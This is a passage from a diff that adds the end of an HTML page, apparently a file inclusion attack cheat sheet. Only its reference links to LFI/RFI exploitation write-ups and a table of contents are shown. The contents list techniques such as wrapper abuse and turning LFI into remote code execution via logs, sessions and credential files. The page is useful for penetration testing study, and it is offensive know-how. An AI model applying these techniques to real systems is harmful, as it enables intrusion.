+  <a href="http://www.soffensive.com/2018/06/exploiting-blind-file-reads-path.html">Exploiting Blind File Reads / Path Traversal Vulnerabilities on Microsoft Windows Operating Systems - @evisneffos</a></li>
+<li>
+  <a href="https://github.com/orangetw/My-CTF-Web-Challenges#babyh-master-php-2017">Baby^H Master PHP 2017 by @orangetw</a></li>
+<li>
+  <a href="https://rdot.org/forum/showthread.php?t=4379">Чтение файлов =&gt; unserialize !</a></li>
+<li>
+  <a href="https://blog.ripstech.com/2018/new-php-exploitation-technique/">New PHP Exploitation Technique - 14 Aug 2018 by Dr. Johannes Dahse</a></li>
+<li>
+  <a href="https://github.com/s-n-t/presentations/blob/master/us-18-Thomas-It%27s-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf">It&rsquo;s-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It, Sam Thomas</a></li>
+<li>
+  <a href="https://medium.com/bugbountywriteup/cvv-1-local-file-inclusion-ebc48e0e479a">CVV #1: Local File Inclusion - @SI9INT - Jun 20, 2018</a></li>
+<li>
+  <a href="http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html?m=1">Exploiting Remote File Inclusion (RFI) in PHP application and bypassing remote URL inclusion restriction</a></li>
+<li>
+  <a href="https://bierbaumer.net/security/php-lfi-with-nginx-assistance/">PHP LFI with Nginx Assistance</a></li>
+<li>
+  <a href="https://gynvael.coldwind.pl/?id=376">PHP LFI to arbitrary code execution via rfc1867 file upload temporary files (EN) - gynvael.coldwind - 2011-03-18</a></li>
+<li>
+  <a href="https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters">LFI2RCE via PHP Filters - HackTricks</a></li>
+<li>
+  <a href="https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d">Solving &ldquo;includer&rsquo;s revenge&rdquo; from hxp ctf 2021 without controlling any files - @loknop</a></li>
+</ul>
+</article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <div class="flex flex-wrap justify-between">
+
+
+
+
+  <div>
+    <a class="flex align-center" href="https://github.com/m00tiny/grayhatfreelancing/edit/main/exampleSite/content.en/docs/file_inclusion.md" target="_blank" rel="noopener">
+      <img src="/svg/edit.svg" class="book-icon" alt="Edit" />
+      <span>Edit this page</span>
+    </a>
+  </div>
+
+
+</div>
+
+
+
+  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>
+
+
+ 
+        
+      </footer>
+
+      
+  
+ 
+
+      <label for="menu-control" class="hidden book-menu-overlay"></label>
+    </div>
+
+    
+    <aside class="book-toc">
+      <div class="book-toc-content">
+        
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#file-inclusion">File Inclusion</a>
+      <ul>
+        <li><a href="#tools">Tools</a></li>
+        <li><a href="#basic-lfi">Basic LFI</a>
+          <ul>
+            <li><a href="#null-byte">Null byte</a></li>
+            <li><a href="#double-encoding">Double encoding</a></li>
+            <li><a href="#utf-8-encoding">UTF-8 encoding</a></li>
+            <li><a href="#path-and-dot-truncation">Path and dot truncation</a></li>
+            <li><a href="#filter-bypass-tricks">Filter bypass tricks</a></li>
+          </ul>
+        </li>
+        <li><a href="#basic-rfi">Basic RFI</a>
+          <ul>
+            <li><a href="#null-byte-1">Null byte</a></li>
+            <li><a href="#double-encoding-1">Double encoding</a></li>
+            <li><a href="#bypass-allow_url_include">Bypass allow_url_include</a></li>
+          </ul>
+        </li>
+        <li><a href="#lfi--rfi-using-wrappers">LFI / RFI using wrappers</a>
+          <ul>
+            <li><a href="#wrapper-phpfilter">Wrapper php://filter</a></li>
+            <li><a href="#wrapper-zip">Wrapper zip://</a></li>
+            <li><a href="#wrapper-data">Wrapper data://</a></li>
+            <li><a href="#wrapper-expect">Wrapper expect://</a></li>
+            <li><a href="#wrapper-input">Wrapper input://</a></li>
+            <li><a href="#wrapper-phar">Wrapper phar://</a></li>
+          </ul>
+        </li>
+        <li><a href="#lfi-to-rce-via-procfd">LFI to RCE via /proc/*/fd</a></li>
+        <li><a href="#lfi-to-rce-via-procselfenviron">LFI to RCE via /proc/self/environ</a></li>
+        <li><a href="#lfi-to-rce-via-upload">LFI to RCE via upload</a></li>
+        <li><a href="#lfi-to-rce-via-upload-race">LFI to RCE via upload (race)</a></li>
+        <li><a href="#lfi-to-rce-via-upload-findfirstfile">LFI to RCE via upload (FindFirstFile)</a></li>
+        <li><a href="#lfi-to-rce-via-phpinfo">LFI to RCE via phpinfo()</a></li>
+        <li><a href="#lfi-to-rce-via-controlled-log-file">LFI to RCE via controlled log file</a>
+          <ul>
+            <li><a href="#rce-via-ssh">RCE via SSH</a></li>
+            <li><a href="#rce-via-mail">RCE via Mail</a></li>
+            <li><a href="#rce-via-apache-logs">RCE via Apache logs</a></li>
+          </ul>
+        </li>
+        <li><a href="#lfi-to-rce-via-php-sessions">LFI to RCE via PHP sessions</a></li>
+        <li><a href="#lfi-to-rce-via-credentials-files">LFI to RCE via credentials files</a>
+          <ul>
+            <li><a href="#windows-version">Windows version</a></li>
+            <li><a href="#linux-version">Linux version</a></li>
+          </ul>
+        </li>
+        <li><a href="#references">References</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+ 
+      </div>
+    </aside>
+    
+  </main>
+
+  
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
